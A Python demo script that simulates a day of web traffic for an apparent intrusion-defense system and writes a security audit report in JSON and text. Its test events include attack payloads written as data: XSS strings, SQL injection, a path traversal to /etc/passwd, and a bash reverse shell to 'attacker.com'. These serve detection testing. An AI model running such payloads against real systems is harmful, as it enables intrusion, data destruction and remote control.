"""
場景: 分析安全事件並生成報告
Security Event Analysis & Report Generation
"""

from src.defense_system import LurRenJiaDefenseSystem
import numpy as np
import json
from datetime import datetime

def main():
    system = LurRenJiaDefenseSystem()

    # 訓練 AI 模型
    print("🔧 初始化防禦系統...")
    normal_data = np.random.randn(1000, 2) * 10 + 50
    system.train_ai_baseline(normal_data)
    print()

    # 模擬一天的流量 - 包括正常和惡意請求
    print("📊 模擬一天流量事件...")
    
    all_events = [
        # 正常流量
        ("192.168.1.10", "GET /api/users", [50, 12]),
        ("192.168.1.11", "POST /api/data", [52, 15]),
        ("192.168.1.12", "GET /dashboard", [48, 10]),
        
        # 惡意流量
        ("10.0.0.5", "<script>alert('XSS')</script>", [52, 12]),
        ("203.0.113.1", "'; DROP TABLE users; --", [50, 15]),
        ("192.168.1.1", "GET /../../etc/passwd", [48, 10]),
        
        # 更多惡意流量
        ("45.33.2.1", "union select version()", [55, 20]),
        ("103.45.2.1", "bash -i >& /dev/tcp/attacker.com/4444 0>&1", [45, 8]),
        ("192.168.1.50", "<img src=x onerror=alert('XSS')>", [50, 12]),
        
        # 正常流量繼續
        ("192.168.1.20", "GET /api/config", [51, 13]),
    ]

    # 分析所有事件
    analysis_results = []
    for ip, payload, features in all_events:
        result = system.analyze_incoming_traffic(ip, payload, np.array(features))
        analysis_results.append(result)

    print()
    
    # 生成審計報告
    print("=" * 100)
    print("🔍 安全審計報告")
    print("=" * 100)
    print()

    stats = system.get_statistics()
    print(f"📅 生成時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"📈 掃描總數: {stats['total_requests']}")
    print(f"🚫 威脅事件: {stats['blocked_requests']}")
    print(f"✅ 允許事件: {stats['allowed_requests']}")
    print(f"🛡️  防禦率: {stats['block_rate']:.1%}")
    print(f"🎯 異常檢測: {stats['anomalies_detected']}")
    print()

    # 詳細事件日誌
    print("=" * 100)
    print("📝 詳細事件日誌：")
    print("=" * 100)
    print()

    events = system.get_event_history()
    
    blocked_count = 0
    allowed_count = 0
    threat_types = {}
    
    for i, event in enumerate(events, 1):
        print(f"事件 #{i}:")
        print(f"  ⏰ 時間: {event['timestamp']}")
        print(f"  🌐 來源 IP: {event['ip']}")
        print(f"  ⚠️  威脅類型: {event['threat_type']}")
        print(f"  📊 風險分數: {event['risk_score']:.1%}")
        print(f"  🔐 行動: {event['action'].upper()}")
        print(f"  📄 負載: {event['payload'][:80]}{'...' if len(event['payload']) > 80 else ''}")
        print()
        
        # 統計
        if event['action'] == 'blocked':
            blocked_count += 1
        else:
            allowed_count += 1
        
        threat_type = event['threat_type']
        threat_types[threat_type] = threat_types.get(threat_type, 0) + 1

    # 威脅統計
    print("=" * 100)
    print("📊 威脅類型統計：")
    print("=" * 100)
    print()
    
    for threat_type, count in sorted(threat_types.items(), key=lambda x: x[1], reverse=True):
        bar = "█" * count + "░" * (12 - count)
        print(f"{threat_type:30s} {bar} ({count})")
    print()

    # 高危事件摘錄
    print("=" * 100)
    print("🚨 高危事件摘錄 (風險分數 > 80%)：")
    print("=" * 100)
    print()
    
    high_risk_count = 0
    for event in events:
        if event['risk_score'] > 0.8:
            high_risk_count += 1
            print(f"⚠️  [{event['threat_type']}] {event['ip']} - 風險: {event['risk_score']:.1%}")
            print(f"   負載: {event['payload'][:100]}...")
            print()
    
    if high_risk_count == 0:
        print("✅ 無高危事件")
        print()

    # 導出為 JSON 報告
    print("=" * 100)
    print("💾 導出報告...")
    print("=" * 100)
    print()
    
    report = {
        'report_metadata': {
            'timestamp': datetime.now().isoformat(),
            'report_title': 'Security Audit Report',
            'organization': 'C45144lAI Security'
        },
        'summary': {
            'total_events': stats['total_requests'],
            'blocked_events': stats['blocked_requests'],
            'allowed_events': stats['allowed_requests'],
            'block_rate': float(stats['block_rate']),
            'anomalies_detected': stats['anomalies_detected']
        },
        'threat_statistics': threat_types,
        'events': events,
        'high_risk_events': [e for e in events if e['risk_score'] > 0.8],
        'recommendations': [
            "🔐 加強 Web 應用防火牆 (WAF) 規則",
            "📡 實時監控來自高危 IP 的流量",
            "🔔 為所有 CRITICAL 威脅啟用告警機制",
            "📊 定期審查和更新威脅簽名庫",
            "🛡️  部署多層防禦策略"
        ]
    }

    report_filename = 'security_report.json'
    with open(report_filename, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"✅ 報告已導出至 {report_filename}")
    print(f"📦 報告大小: {len(json.dumps(report))} 字節")
    print()
    
    # 生成文本格式的簡要報告
    report_txt = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                           安全審計報告 (文本版)                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

📅 報告時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 流量統計:
   • 掃描總數: {stats['total_requests']}
   • 威脅事件: {stats['blocked_requests']}
   • 允許事件: {stats['allowed_requests']}
   • 防禦率: {stats['block_rate']:.1%}
   • 異常檢測: {stats['anomalies_detected']}

⚠️  威脅類型分布:
"""
    
    for threat_type, count in sorted(threat_types.items(), key=lambda x: x[1], reverse=True):
        report_txt += f"   • {threat_type}: {count} 次\n"
    
    report_txt += f"""
🚨 高危事件: {high_risk_count}
✅ 正常事件: {allowed_count}
🚫 被阻止事件: {blocked_count}

💡 建議事項:
   1. 加強 Web 應用防火牆 (WAF) 規則
   2. 實時監控來自高危 IP 的流量
   3. 為所有 CRITICAL 威脅啟用告警機制
   4. 定期審查和更新威脅簽名庫
   5. 部署多層防禦策略

═══════════════════════════════════════════════════════════════════════════════
報告生成者: C45144lAI 防禦系統 v2.0
"""
    
    report_txt_filename = 'security_report.txt'
    with open(report_txt_filename, 'w', encoding='utf-8') as f:
        f.write(report_txt)
    
    print(f"✅ 文本報告已導出至 {report_txt_filename}")
    print()
    
    # 最終總結
    print("=" * 100)
    print("✅ 安全事件分析完成")
    print("=" * 100)

if __name__ == "__main__":
    main()
